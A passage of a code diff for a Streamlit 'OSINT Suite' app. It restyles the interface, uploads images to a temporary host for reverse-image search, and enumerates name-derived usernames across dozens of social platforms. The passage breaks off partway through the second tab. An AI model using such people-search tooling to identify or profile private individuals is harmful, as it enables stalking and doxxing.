@@ -1,1886 +1,950 @@
-import sys, os, io, json, re, time, hashlib, urllib.parse, base64, socket, types, math
+#!/usr/bin/env python3
+"""OSINT Suite — Run: streamlit run osint_suite.py"""
+
+import sys, os, io, re, math, time, socket, types, base64
+import hashlib, urllib.parse, string, random
+from collections import Counter
 from datetime import datetime
+
 import requests
 import streamlit as st
 from PIL import Image, ExifTags
-import dns.resolver
-from collections import Counter
 
-# Python 3.13 patch
-if "pkg_resources" not in sys.modules:
-    _mock = types.ModuleType("pkg_resources")
-    _mock.resource_filename = lambda p, r: os.path.join("/tmp", r)
-    sys.modules["pkg_resources"] = _mock
-
-# Optional magic for file type detection
 try:
-    import magic
-    HAS_MAGIC = True
+    import dns.resolver
+    HAS_DNS = True
 except ImportError:
-    HAS_MAGIC = False
+    HAS_DNS = False
 
-st.set_page_config(page_title="OSINT Suite Pro", page_icon="🕵️", layout="wide")
+if "pkg_resources" not in sys.modules:
+    import types as _t
+    _m = _t.ModuleType("pkg_resources")
+    _m.resource_filename = lambda p, r: os.path.join("/tmp", r)
+    sys.modules["pkg_resources"] = _m
 
-# ========== LIQUID GLASS + iOS ANIMATION CSS ==========
+st.set_page_config(page_title="OSINT Suite", page_icon="🕵️", layout="wide", initial_sidebar_state="collapsed")
+
 st.markdown("""
 <style>
-@import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;600;700&family=Share+Tech+Mono&display=swap');
-
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-.stApp {
-    background:
-        radial-gradient(ellipse 80% 60% at 20% 10%, rgba(0,100,255,0.18) 0%, transparent 60%),
-        radial-gradient(ellipse 60% 50% at 80% 80%, rgba(0,220,255,0.12) 0%, transparent 55%),
-        radial-gradient(ellipse 100% 100% at 50% 50%, #04080f 0%, #01030a 100%);
-    min-height: 100vh;
-}
-
-/* Animated ambient orbs behind everything */
-.stApp::before {
-    content:'';
-    position:fixed; top:-20%; left:-10%;
-    width:500px; height:500px;
-    background: radial-gradient(circle, rgba(0,120,255,0.12), transparent 70%);
-    border-radius:50%;
-    animation: floatOrb 12s ease-in-out infinite;
-    pointer-events:none; z-index:0;
-}
-.stApp::after {
-    content:'';
-    position:fixed; bottom:-10%; right:-5%;
-    width:400px; height:400px;
-    background: radial-gradient(circle, rgba(0,230,255,0.10), transparent 70%);
-    border-radius:50%;
-    animation: floatOrb 16s ease-in-out infinite reverse;
-    pointer-events:none; z-index:0;
-}
-
-@keyframes floatOrb {
-    0%,100% { transform: translate(0,0) scale(1); }
-    33% { transform: translate(40px,-30px) scale(1.1); }
-    66% { transform: translate(-20px,20px) scale(0.95); }
-}
-
-/* iOS liquid glass card */
-.glass-card {
-    background: linear-gradient(135deg,
-        rgba(255,255,255,0.07) 0%,
-        rgba(255,255,255,0.03) 50%,
-        rgba(0,180,255,0.05) 100%);
-    backdrop-filter: blur(28px) saturate(180%);
-    -webkit-backdrop-filter: blur(28px) saturate(180%);
-    border-radius: 24px;
-    border: 1px solid rgba(255,255,255,0.12);
-    box-shadow:
-        0 8px 32px rgba(0,0,0,0.4),
-        inset 0 1px 0 rgba(255,255,255,0.15),
-        inset 0 -1px 0 rgba(0,0,0,0.2);
-    padding: 1.4rem 1.6rem;
-    margin: 0.8rem 0;
-    transition: transform 0.3s cubic-bezier(0.34,1.56,0.64,1),
-                box-shadow 0.3s ease,
-                border-color 0.3s ease;
-    position: relative; overflow: hidden;
-}
-.glass-card::before {
-    content:'';
-    position:absolute; top:0; left:-60%;
-    width:40%; height:100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.06), transparent);
-    transform: skewX(-15deg);
-    transition: left 0.6s ease;
-}
-.glass-card:hover::before { left:120%; }
-.glass-card:hover {
-    border-color: rgba(0,200,255,0.35);
-    box-shadow: 0 16px 48px rgba(0,0,0,0.5), 0 0 40px rgba(0,180,255,0.12),
-                inset 0 1px 0 rgba(255,255,255,0.2);
-    transform: translateY(-3px) scale(1.005);
-}
-
-/* Buttons */
-.stButton > button {
-    background: linear-gradient(135deg, rgba(0,160,255,0.9), rgba(0,80,220,0.9));
-    backdrop-filter: blur(12px);
-    border: 1px solid rgba(255,255,255,0.2) !important;
-    border-radius: 50px !important;
-    padding: 0.55rem 1.4rem !important;
-    font-weight: 600 !important;
-    color: white !important;
-    font-family: 'Share Tech Mono', monospace !important;
-    letter-spacing: 0.03em;
-    box-shadow: 0 4px 15px rgba(0,100,255,0.3), inset 0 1px 0 rgba(255,255,255,0.25);
-    transition: all 0.25s cubic-bezier(0.34,1.56,0.64,1) !important;
-}
-.stButton > button:hover {
-    transform: translateY(-2px) scale(1.03) !important;
-    box-shadow: 0 8px 25px rgba(0,120,255,0.45), inset 0 1px 0 rgba(255,255,255,0.3) !important;
-}
-.stButton > button:active { transform: scale(0.97) !important; }
-
-/* Tabs — liquid glass pill nav */
-.stTabs [data-baseweb="tab-list"] {
-    background: linear-gradient(135deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
-    backdrop-filter: blur(30px) saturate(200%);
-    -webkit-backdrop-filter: blur(30px) saturate(200%);
-    border-radius: 60px;
-    padding: 5px 6px;
-    gap: 4px;
-    border: 1px solid rgba(255,255,255,0.12);
-    box-shadow: 0 4px 24px rgba(0,0,0,0.35),
-                inset 0 1px 0 rgba(255,255,255,0.15),
-                inset 0 -1px 0 rgba(0,0,0,0.15);
-}
-.stTabs [data-baseweb="tab"] {
-    font-family: 'Share Tech Mono', monospace !important;
-    font-size: 0.78rem !important;
-    color: rgba(180,210,240,0.75) !important;
-    padding: 0.45rem 1.2rem !important;
-    border-radius: 50px !important;
-    transition: all 0.3s cubic-bezier(0.34,1.56,0.64,1) !important;
-}
-.stTabs [data-baseweb="tab"]:hover { color: #fff !important; }
-.stTabs [aria-selected="true"] {
-    background: linear-gradient(135deg, rgba(0,160,255,0.85), rgba(0,70,210,0.85)) !important;
-    color: white !important;
-    box-shadow: 0 2px 16px rgba(0,140,255,0.45),
-                inset 0 1px 0 rgba(255,255,255,0.3) !important;
-    transform: scale(1.04);
-}
-
-/* Inputs */
-.stTextInput > div > div > input,
-.stTextArea > div > div > textarea {
-    background: rgba(255,255,255,0.04) !important;
-    backdrop-filter: blur(16px) !important;
-    border: 1px solid rgba(255,255,255,0.12) !important;
-    border-radius: 50px !important;
-    color: #e8f4ff !important;
-    font-family: 'Share Tech Mono', monospace !important;
-    padding: 0.65rem 1.2rem !important;
-    transition: all 0.3s ease !important;
-    box-shadow: inset 0 1px 3px rgba(0,0,0,0.3) !important;
-}
-.stTextInput > div > div > input:focus,
-.stTextArea > div > div > textarea:focus {
-    border-color: rgba(0,180,255,0.5) !important;
-    box-shadow: 0 0 0 3px rgba(0,160,255,0.15), inset 0 1px 3px rgba(0,0,0,0.3) !important;
-}
-
-/* Result cards */
-.result-card {
-    background: linear-gradient(135deg, rgba(0,180,255,0.07), rgba(0,80,200,0.04));
-    border-left: 2px solid rgba(0,200,255,0.5);
-    border-radius: 14px;
-    padding: 0.75rem 1rem;
-    margin: 0.4rem 0;
-    backdrop-filter: blur(8px);
-    border-top: 1px solid rgba(255,255,255,0.07);
-    transition: background 0.2s, transform 0.2s;
-}
-.result-card:hover { background: rgba(0,180,255,0.12); transform: translateX(4px); }
-
-h1,h2,h3 { font-family: 'Share Tech Mono', monospace; color: #e0f4ff; }
-code {
-    background: rgba(0,180,255,0.1);
-    border: 1px solid rgba(0,180,255,0.2);
-    border-radius: 8px; padding: 0.15rem 0.5rem;
-    color: #00e5ff; font-family: 'Share Tech Mono', monospace; font-size: 0.85em;
-}
-hr { border-color: rgba(255,255,255,0.06); margin: 1rem 0; }
-
-/* Fade-in animation for content */
-@keyframes fadeSlideUp {
-    from { opacity:0; transform: translateY(18px); }
-    to   { opacity:1; transform: translateY(0); }
-}
-.glass-card, .result-card { animation: fadeSlideUp 0.45s cubic-bezier(0.22,1,0.36,1) both; }
-
-/* Sidebar */
-section[data-testid="stSidebar"] > div {
-    background: linear-gradient(180deg, rgba(5,12,22,0.95), rgba(2,6,14,0.98)) !important;
-    backdrop-filter: blur(30px) !important;
-    border-right: 1px solid rgba(255,255,255,0.07) !important;
-}
-
-/* Status bar dot pulse */
-@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
-.live-dot {
-    display:inline-block; width:8px; height:8px;
-    background:#00e676; border-radius:50%;
-    animation: pulse 2s ease infinite;
-    margin-right:6px; vertical-align:middle;
-}
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Space+Grotesk:wght@300;400;500;600;700&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+.stApp{background:#020810;background-image:radial-gradient(ellipse 90% 55% at 15% 8%,rgba(0,180,255,.08) 0%,transparent 55%),radial-gradient(ellipse 70% 70% at 85% 90%,rgba(120,0,255,.07) 0%,transparent 55%),repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,255,.008) 3px,rgba(0,255,255,.008) 4px);min-height:100vh}
+body,.stApp,p,span,div,label{font-family:'Space Grotesk',sans-serif!important;color:#c0d8ee}
+h1,h2,h3,h4{font-family:'Share Tech Mono',monospace!important}
+.glass{background:linear-gradient(140deg,rgba(255,255,255,.065),rgba(255,255,255,.018));backdrop-filter:blur(22px) saturate(160%);border-radius:22px;border:1px solid rgba(255,255,255,.1);box-shadow:0 8px 36px rgba(0,0,0,.45),inset 0 1px 0 rgba(255,255,255,.07);padding:1.3rem 1.5rem;margin:.6rem 0}
+.tip{background:rgba(0,255,160,.05);border-left:3px solid #00ffaa;border-radius:0 14px 14px 0;padding:.65rem 1.1rem;margin:.4rem 0 .9rem;font-size:.875rem;color:#8ae8c4}
+.warn{background:rgba(255,170,0,.06);border-left:3px solid #ffaa00;border-radius:0 14px 14px 0;padding:.65rem 1.1rem;margin:.4rem 0;font-size:.875rem;color:#ffd070}
+.danger{background:rgba(255,50,50,.07);border-left:3px solid #ff4444;border-radius:0 14px 14px 0;padding:.65rem 1.1rem;margin:.4rem 0;color:#ff9090}
+.success-box{background:rgba(0,255,120,.07);border-left:3px solid #00ff88;border-radius:0 14px 14px 0;padding:.65rem 1.1rem;margin:.4rem 0;color:#80ffbb}
+.rcard{background:rgba(0,195,255,.055);border:1px solid rgba(0,195,255,.14);border-radius:14px;padding:.7rem 1rem;margin:.35rem 0}
+.rcard a{color:#00e0ff;text-decoration:none}
+.badge-found{display:inline-block;background:rgba(0,255,130,.15);border:1px solid rgba(0,255,130,.5);border-radius:20px;padding:1px 9px;font-size:.72rem;color:#00ff88;margin-left:6px}
+.stat-row{display:flex;gap:10px;flex-wrap:wrap;margin:.7rem 0}
+.stat-pill{background:rgba(0,195,255,.07);border:1px solid rgba(0,195,255,.18);border-radius:40px;padding:4px 13px;font-size:.8rem;color:#6dd8f8}
+.sec-title{font-family:'Share Tech Mono',monospace;font-size:1.1rem;font-weight:700;color:#d8f0ff;margin:1rem 0 .6rem;display:flex;align-items:center;gap:8px}
+.sec-title::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,rgba(0,195,255,.25),transparent);margin-left:8px}
+.stButton>button{background:linear-gradient(135deg,#00c0ff,#004ecc)!important;border:none!important;border-radius:50px!important;padding:.52rem 1.4rem!important;font-weight:600!important;color:#fff!important;box-shadow:0 4px 16px rgba(0,110,255,.38)!important;transition:all .2s!important}
+.stButton>button:hover{transform:translateY(-2px)!important;box-shadow:0 8px 26px rgba(0,110,255,.6)!important}
+.stTextInput input,.stTextArea textarea{background:rgba(8,18,32,.78)!important;border:1px solid rgba(0,195,255,.18)!important;border-radius:50px!important;color:#e2f2ff!important;font-family:'Share Tech Mono',monospace!important;font-size:.93rem!important;padding:.6rem 1.1rem!important}
+.stTextArea textarea{border-radius:16px!important}
+.stTabs [data-baseweb="tab-list"]{display:flex!important;justify-content:center!important;flex-wrap:wrap!important;background:rgba(4,12,24,.82)!important;backdrop-filter:blur(18px)!important;border-radius:60px!important;padding:6px 12px!important;gap:4px!important;border:1px solid rgba(0,195,255,.14)!important;margin:0 auto!important;width:fit-content!important}
+.stTabs [data-baseweb="tab"]{font-family:'Space Grotesk',sans-serif!important;font-weight:500!important;font-size:.75rem!important;color:#607a92!important;padding:.4rem 1rem!important;border-radius:40px!important;white-space:nowrap!important}
+.stTabs [aria-selected="true"]{background:linear-gradient(135deg,#00c0ff,#0050cc)!important;color:#fff!important;box-shadow:0 0 20px rgba(0,192,255,.45)!important}
+pre,code{font-family:'Share Tech Mono',monospace!important;font-size:.83rem!important}
+.stProgress>div>div>div{background:linear-gradient(90deg,#00c0ff,#00ff88)!important;border-radius:10px!important}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:rgba(0,0,0,.25)}::-webkit-scrollbar-thumb{background:rgba(0,195,255,.28);border-radius:3px}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
+.ldot{display:inline-block;width:7px;height:7px;background:#00ff88;border-radius:50%;animation:blink 1.8s infinite;margin-right:5px;vertical-align:middle}
 </style>
 """, unsafe_allow_html=True)
 
-# ========== SVG LOGO + HEADER ==========
 st.markdown("""
-<div style="display:flex; flex-direction:column; align-items:center; padding: 2rem 0 0.5rem; gap:0.6rem;">
-
-  <!-- Liquid glass orb logo -->
-  <div style="
-    width:96px; height:96px; border-radius:50%;
-    background: linear-gradient(135deg, rgba(0,160,255,0.25), rgba(0,40,120,0.35));
-    backdrop-filter: blur(20px) saturate(180%);
-    border: 1.5px solid rgba(255,255,255,0.25);
-    box-shadow: 0 8px 40px rgba(0,120,255,0.4),
-                0 0 80px rgba(0,200,255,0.15),
-                inset 0 2px 0 rgba(255,255,255,0.35),
-                inset 0 -2px 0 rgba(0,0,0,0.2);
-    display:flex; align-items:center; justify-content:center;
-    position:relative; overflow:hidden;
-    animation: floatOrb 6s ease-in-out infinite;
-  ">
-    <!-- highlight shimmer -->
-    <div style="
-      position:absolute; top:8px; left:14px;
-      width:30px; height:12px;
-      background: rgba(255,255,255,0.35);
-      border-radius:50%; filter:blur(4px);
-      transform: rotate(-25deg);
-    "></div>
-    <!-- Detective with magnifying glass SVG -->
-    <svg width="52" height="52" viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <!-- Hat brim -->
-      <rect x="12" y="20" width="24" height="4" rx="2" fill="rgba(255,255,255,0.95)"/>
-      <!-- Hat top -->
-      <rect x="16" y="9" width="16" height="13" rx="3" fill="rgba(255,255,255,0.95)"/>
-      <!-- Hat band -->
-      <rect x="16" y="18" width="16" height="3" rx="1" fill="rgba(0,180,255,0.8)"/>
-      <!-- Head -->
-      <ellipse cx="24" cy="30" rx="8" ry="7" fill="rgba(255,220,170,0.9)"/>
-      <!-- Body / coat -->
-      <path d="M14 44 Q14 36 24 35 Q34 36 34 44 Z" fill="rgba(255,255,255,0.85)"/>
-      <!-- Magnifying glass handle -->
-      <line x1="34" y1="36" x2="42" y2="44" stroke="rgba(255,255,255,0.9)" stroke-width="3" stroke-linecap="round"/>
-      <!-- Magnifying glass circle -->
-      <circle cx="31" cy="33" r="7" stroke="rgba(0,220,255,1)" stroke-width="2.5" fill="rgba(0,180,255,0.15)"/>
-      <!-- Lens glint -->
-      <circle cx="28.5" cy="30.5" r="1.5" fill="rgba(255,255,255,0.6)"/>
-    </svg>
-  </div>
-
-  <!-- Wordmark -->
-  <div style="text-align:center;">
-    <div style="
-      font-family:'Share Tech Mono',monospace;
-      font-size:2.4rem; font-weight:700; letter-spacing:0.08em;
-      background: linear-gradient(135deg, #ffffff 20%, #00d4ff 60%, #0080ff 100%);
-      -webkit-background-clip:text; -webkit-text-fill-color:transparent;
-      line-height:1;
-    ">OSINT SUITE</div>
-    <div style="
-      font-family:'Share Tech Mono',monospace;
-      font-size:0.7rem; letter-spacing:0.35em; color:rgba(0,200,255,0.7);
-      margin-top:4px; text-transform:uppercase;
-    ">PRO · INTELLIGENCE PLATFORM</div>
-  </div>
-
-  <!-- Pill badges -->
-  <div style="display:flex; gap:8px; flex-wrap:wrap; justify-content:center; margin-top:4px;">
-    <span style="background:rgba(0,200,255,0.1);border:1px solid rgba(0,200,255,0.25);border-radius:50px;padding:3px 12px;font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:#00d4ff;letter-spacing:0.1em;"><span class='live-dot'></span>LIVE</span>
-    <span style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:50px;padding:3px 12px;font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:rgba(180,210,240,0.7);letter-spacing:0.08em;">REAL DATA</span>
-    <span style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:50px;padding:3px 12px;font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:rgba(180,210,240,0.7);letter-spacing:0.08em;">v2.0 · 2026</span>
-  </div>
+<div style="text-align:center;padding:1.5rem 0 .4rem">
+  <div style="font-size:2.8rem;margin-bottom:.25rem">🕵️</div>
+  <div style="font-family:'Share Tech Mono',monospace;font-size:2rem;font-weight:800;background:linear-gradient(135deg,#fff,#00ddff 55%,#9b72ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent">OSINT Suite</div>
+  <div style="color:#3d6070;font-size:.75rem;margin-top:.45rem"><span class='ldot'></span>live lookups · nothing stored · free to use</div>
 </div>
 """, unsafe_allow_html=True)
 
 with st.sidebar:
+    st.markdown("### 🕵️ OSINT Suite")
     st.markdown("""
-    <div style='padding:0.5rem 0 1rem;'>
-      <div style='font-family:"Share Tech Mono",monospace;font-size:0.65rem;letter-spacing:0.3em;color:rgba(0,200,255,0.5);margin-bottom:1rem;text-transform:uppercase;'>Navigation</div>
-      <div style='display:flex;flex-direction:column;gap:6px;'>
-    """ + "".join([
-        f"<div style='padding:8px 14px;border-radius:12px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.07);font-family:\"Share Tech Mono\",monospace;font-size:0.78rem;color:rgba(200,225,255,0.8);'>{icon}</div>"
-        for icon in ["🔍 Reverse Image","👤 Username Hunt","📧 Email OSINT","📁 Metadata","🎯 CTF Solver","🔬 Deep File Scan","🌐 Network Recon","🔑 Password Intel"]
-    ]) + """
-      </div>
-    </div>
-    <hr style='border-color:rgba(255,255,255,0.06);margin:1rem 0;'/>
-    """, unsafe_allow_html=True)
-    st.markdown("""
-    <div style='font-family:"Share Tech Mono",monospace;font-size:0.65rem;color:rgba(120,160,200,0.5);line-height:1.8;'>
-    <span style='color:rgba(0,230,100,0.8);'>●</span> All data is live &amp; real<br>
-    <span style='color:rgba(0,200,255,0.6);'>◆</span> Open-source intelligence<br>
-    <span style='color:rgba(180,180,255,0.5);'>▸</span> v2.0 · June 2026
-    </div>
-    """, unsafe_allow_html=True)
+Tools inside:
+- 🔍 Reverse Image
+- 👤 Username & Social Media
+- 📧 Email Lookup
+- 📁 File Metadata
+- 🎯 CTF Solver
+- 🔬 Deep File Scan
+- 🌐 Network Recon
+- 🔐 Password Tools
+    """)
+    st.caption("Everything runs in your browser. No accounts, no tracking.")
 
-tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8, tab9, tab10, tab11, tab12, tab13, tab14 = st.tabs([
-    "🔍 Reverse Image", "👤 Username Hunt", "📧 Email OSINT",
-    "📁 Metadata", "🎯 CTF Solver", "🔬 Deep File Scan", "🌐 Network Recon", "🔑 Password Intel",
-    "🎵 TikTok Finder", "🛡️ Pentest Suite", "🔐 Crypto CTF+", "🕵️ Google Dorking", "🌐 Subdomain Recon", "📖 Beginner Guide"
+tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs([
+    "🔍 Image", "👤 Social Media", "📧 Email", "📁 Metadata",
+    "🎯 CTF", "🔬 Deep Scan", "🌐 Network", "🔐 Passwords"
 ])
 
-# ========== TAB 1: Reverse Image ==========
+def sec(txt): st.markdown(f"<div class='sec-title'>{txt}</div>", unsafe_allow_html=True)
+def tip(msg): st.markdown(f"<div class='tip'>💡 {msg}</div>", unsafe_allow_html=True)
+def warn(msg): st.markdown(f"<div class='warn'>⚠️ {msg}</div>", unsafe_allow_html=True)
+def danger(msg): st.markdown(f"<div class='danger'>🚨 {msg}</div>", unsafe_allow_html=True)
+def ok(msg): st.markdown(f"<div class='success-box'>✅ {msg}</div>", unsafe_allow_html=True)
+def rcard(html): st.markdown(f"<div class='rcard'>{html}</div>", unsafe_allow_html=True)
+def glass(html): st.markdown(f"<div class='glass'>{html}</div>", unsafe_allow_html=True)
+def pills(pairs):
+    inner = "".join(f"<span class='stat-pill'>{k}: <b>{v}</b></span>" for k, v in pairs)
+    st.markdown(f"<div class='stat-row'>{inner}</div>", unsafe_allow_html=True)
+
+
+# ── TAB 1: REVERSE IMAGE ────────────────────────────────────────────────
 with tab1:
-    st.markdown("### 🔍 Reverse Image Search")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Upload an image — we host it and open every major reverse-search engine pre-loaded.</p>", unsafe_allow_html=True)
-    img_file = st.file_uploader("Upload photo", type=["jpg","png","jpeg","webp"], key="rev")
+    sec("Reverse Image Search")
+    st.markdown("""
+**What is this?** Upload a photo and we'll host it for you, then you can run it through Google, Yandex, Bing, and TinEye with one click.
+
+**When is this useful?**
+- You want to find out who someone is from a photo
+- You want to check if a photo has been used elsewhere online
+- You found an image and want to trace where it originally came from
+""")
+    tip("Best results: use a clear, unedited photo. Cropped headshots work better than group photos for face searches.")
+
+    img_file = st.file_uploader("Pick an image to search", type=["jpg","png","jpeg","webp","gif"], key="rev_img")
     if img_file:
         img_bytes = img_file.getvalue()
-        col1, col2 = st.columns([1,1.5])
-        with col1:
-            st.image(img_bytes, width=200)
-        with col2:
-            st.markdown(f"**File:** {img_file.name}  \n**Size:** {len(img_bytes)//1024} KB")
-        with st.spinner("Uploading to relay..."):
-            try:
-                r = requests.post("https://tmpfiles.org/api/v1/upload", files={'file': (img_file.name, img_bytes)}, timeout=15)
-                if r.status_code == 200:
-                    raw = r.json()['data']['url']
-                    direct = raw.replace("tmpfiles.org/", "tmpfiles.org/dl/")
-                    enc = urllib.parse.quote_plus(direct)
-                    st.success("✅ Ready")
-                    engines = {
-                        "🔍 Google Lens": f"https://lens.google.com/uploadbyurl?url={enc}",
-                        "🇷🇺 Yandex": f"https://yandex.com/images/search?rpt=imageview&url={enc}",
-                        "🌐 Bing Visual": f"https://www.bing.com/images/search?view=detailv2&iss=sbi&q=imgurl:{enc}",
-                        "🕵️ TinEye": f"https://tineye.com/search?url={enc}"
-                    }
-                    cols = st.columns(2)
-                    for i,(name,url) in enumerate(engines.items()):
-                        with cols[i%2]:
-                            st.link_button(name, url, use_container_width=True)
-                else:
-                    st.error("Upload failed")
-            except Exception as e:
-                st.error(f"Error: {e}")
-
-# ========== TAB 2: Username Hunt ==========
-with tab2:
-    st.markdown("### 👤 Username Hunt")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Search a username or real name across 12 platforms simultaneously.</p>", unsafe_allow_html=True)
-    query = st.text_input("Name or username", placeholder="username or John Doe", key="username_input")
-    mode = st.radio("Mode", ["Username → Socials", "Name → Socials"], horizontal=True)
-    if st.button("🔍 Hunt", use_container_width=True) and query:
-        candidates = set()
-        q = query.strip().lower()
-        if mode == "Username → Socials":
-            candidates.add(q)
-        else:
-            parts = q.split()
-            if len(parts) >= 1:
-                first = parts[0]
-                last = parts[-1] if len(parts) > 1 else ""
-                candidates.add(q.replace(" ", ""))
-                candidates.add(q.replace(" ", "."))
-                candidates.add(q.replace(" ", "_"))
-                if last:
-                    candidates.add(f"{first}{last}")
-                    candidates.add(f"{first}.{last}")
-                    candidates.add(f"{first}_{last}")
-                    candidates.add(f"{first}{last[:2]}")
-                    candidates.add(f"{first[0]}{last}")
-                    candidates.add(f"{last}{first}")
-                    candidates.add(f"{first}{last}1")
-        candidates = list(candidates)[:20]
-        
-        platforms = {
-            # Video / streaming
-            "🎵 TikTok":          "https://tiktok.com/@{}",
-            "🎬 YouTube":         "https://youtube.com/@{}",
-            "📺 Twitch":          "https://twitch.tv/{}",
-            "🎥 Dailymotion":     "https://dailymotion.com/{}",
-            "🎞️ Vimeo":           "https://vimeo.com/{}",
-            "▶️ Rumble":          "https://rumble.com/user/{}",
-            "🎮 Kick":            "https://kick.com/{}",
-            "🌊 Triller":         "https://triller.co/@{}",
-            # Photo / visual
-            "📸 Instagram":       "https://instagram.com/{}",
-            "📌 Pinterest":       "https://pinterest.com/{}",
-            "📷 Flickr":          "https://flickr.com/people/{}",
-            "🖼️ DeviantArt":      "https://deviantart.com/{}",
-            "🎨 Behance":         "https://behance.net/{}",
-            "🖌️ ArtStation":      "https://artstation.com/{}",
-            "📐 Dribbble":        "https://dribbble.com/{}",
-            "👁️ 500px":           "https://500px.com/p/{}",
-            "🌅 VSCO":            "https://vsco.co/{}",
-            # Social / micro-blogging
-            "🐦 Twitter/X":       "https://twitter.com/{}",
-            "📘 Facebook":        "https://facebook.com/{}",
-            "💼 LinkedIn":        "https://linkedin.com/in/{}",
-            "🔵 Bluesky":         "https://bsky.app/profile/{}",
-            "🐘 Mastodon":        "https://mastodon.social/@{}",
-            "🟠 Threads":         "https://threads.net/@{}",
-            "📣 Truth Social":    "https://truthsocial.com/@{}",
-            "📝 Tumblr":          "https://tumblr.com/{}",
-            "🔗 Medium":          "https://medium.com/@{}",
-            "📰 Substack":        "https://substack.com/@{}",
-            "🌐 Blogger":         "https://{}.blogspot.com",
-            "🪐 Pillowfort":      "https://pillowfort.social/{}",
-            # Dev / tech
-            "💻 GitHub":          "https://github.com/{}",
-            "🦊 GitLab":          "https://gitlab.com/{}",
-            "🪣 Bitbucket":       "https://bitbucket.org/{}",
-            "🖥️ HackerNews":      "https://news.ycombinator.com/user?id={}",
-            "📦 npm":             "https://www.npmjs.com/~{}",
-            "🐍 PyPI":            "https://pypi.org/user/{}",
-            "🔶 Stack Overflow":  "https://stackoverflow.com/users/{}",
-            "💬 Dev.to":          "https://dev.to/{}",
-            "🦀 Codeforces":      "https://codeforces.com/profile/{}",
-            "⚔️ HackTheBox":      "https://app.hackthebox.com/users/{}",
-            "🚩 TryHackMe":       "https://tryhackme.com/p/{}",
-            # Community / forums
-            "🤖 Reddit":          "https://reddit.com/user/{}",
-            "💬 Discord":         "https://discord.com/users/{}",
-            "📱 Telegram":        "https://t.me/{}",
-            "🗣️ Quora":           "https://quora.com/profile/{}",
-            "🏆 Kahoot":          "https://create.kahoot.it/profiles/{}",
-            "🎮 Steam":           "https://steamcommunity.com/id/{}",
-            "🎮 Xbox":            "https://xboxgamertag.com/search/{}",
-            "🎮 PlayStation":     "https://psnprofiles.com/{}",
-            "🎮 Roblox":          "https://roblox.com/user.aspx?username={}",
-            # Music
-            "🎵 SoundCloud":      "https://soundcloud.com/{}",
-            "🎶 Spotify":         "https://open.spotify.com/user/{}",
-            "🎤 Last.fm":         "https://last.fm/user/{}",
-            "🎵 Bandcamp":        "https://bandcamp.com/{}",
-            "🎹 ReverbNation":    "https://reverbnation.com/{}",
-            # Professional / niche
-            "🐈 Product Hunt":    "https://producthunt.com/@{}",
-            "🌍 About.me":        "https://about.me/{}",
-            "🔑 Keybase":         "https://keybase.io/{}",
-            "📊 Kaggle":          "https://kaggle.com/{}",
-            "✍️ Wattpad":          "https://wattpad.com/user/{}",
-            "📚 Goodreads":       "https://goodreads.com/{}",
-            "🎯 Patreon":         "https://patreon.com/{}",
-            "☕ Ko-fi":            "https://ko-fi.com/{}",
-            # Asian / regional platforms
-            "🇨🇳 Weibo":           "https://weibo.com/n/{}",
-            "🇰🇷 Naver Blog":      "https://blog.naver.com/{}",
-            "🇷🇺 VK":              "https://vk.com/{}",
-            "🇩🇪 Xing":            "https://xing.com/profile/{}",
-        }
-        
-        results = []
-        progress = st.progress(0)
-        status = st.empty()
-        total = len(candidates) * len(platforms)
-        done = 0
-        for username in candidates:
-            status.markdown(f"<code>▶ Trying @{username}</code>", unsafe_allow_html=True)
-            for plat, url_tmpl in platforms.items():
-                url = url_tmpl.format(username)
+        c1, c2 = st.columns([1, 2])
+        with c1:
+            st.image(img_bytes, width=210, caption=img_file.name)
+        with c2:
+            pills([("File", img_file.name), ("Size", f"{max(1,len(img_bytes)//1024)} KB")])
+            with st.spinner("Uploading image..."):
                 try:
-                    resp = requests.get(url, timeout=4, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True)
+                    r = requests.post("https://tmpfiles.org/api/v1/upload",
+                                      files={"file": (img_file.name, img_bytes)}, timeout=20)
+                    if r.status_code == 200:
+                        raw_url = r.json()["data"]["url"]
+                        direct = raw_url.replace("tmpfiles.org/", "tmpfiles.org/dl/")
+                        enc = urllib.parse.quote_plus(direct)
+                        ok("Image uploaded. Click a search engine below:")
+                        engines = {
+                            "Google Lens": f"https://lens.google.com/uploadbyurl?url={enc}",
+                            "Yandex": f"https://yandex.com/images/search?rpt=imageview&url={enc}",
+                            "Bing Visual": f"https://www.bing.com/images/search?view=detailv2&iss=sbi&q=imgurl:{enc}",
+                            "TinEye": f"https://tineye.com/search?url={enc}",
+                        }
+                        cols = st.columns(2)
+                        for i, (name, url) in enumerate(engines.items()):
+                            with cols[i % 2]:
+                                st.link_button(name, url, use_container_width=True)
+                        st.caption(f"Direct link (valid ~60 min): {direct}")
+                    else:
+                        danger("Upload failed. Try a smaller JPEG.")
+                except Exception as e:
+                    danger(f"Upload error: {e}")
+
+
+# ── TAB 2: SOCIAL MEDIA / USERNAME ─────────────────────────────────────
+with tab2:
+    sec("Social Media & Username Search")
+    st.markdown("""
+**What does this do?** You give it a username or a real name, and it checks 20+ platforms to see if that account exists — TikTok, Instagram, Twitter/X, GitHub, YouTube, LinkedIn, and more.
+
+**How to use it:**
